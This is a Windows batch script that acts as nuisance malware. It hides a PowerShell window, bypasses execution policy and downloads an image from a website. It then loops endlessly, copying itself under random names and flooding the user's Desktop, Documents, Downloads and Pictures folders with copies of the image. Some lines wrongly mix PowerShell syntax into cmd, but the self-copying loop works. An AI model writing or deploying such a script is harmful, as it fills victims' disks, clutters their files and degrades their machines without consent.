@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "curl -o %TEMP%\image.png https://templeos.org/Templeos-header.png"

:loop
copy %PUBLIC%\sigma\startup.bat %PUBLIC%\sigma\startup-%random%.bat
copy %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%image.png
copy %TEMP%\image.png $env:%USERPROFILE%\Documents\%random%image.png
copy %TEMP%\image.png $env:%USERPROFILE%\Downloads\%random%image.png
copy %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%image.png
copy %PUBLIC%\sigma\startup.bat %PUBLIC%\sigma\startup-%random%.bat
goto loop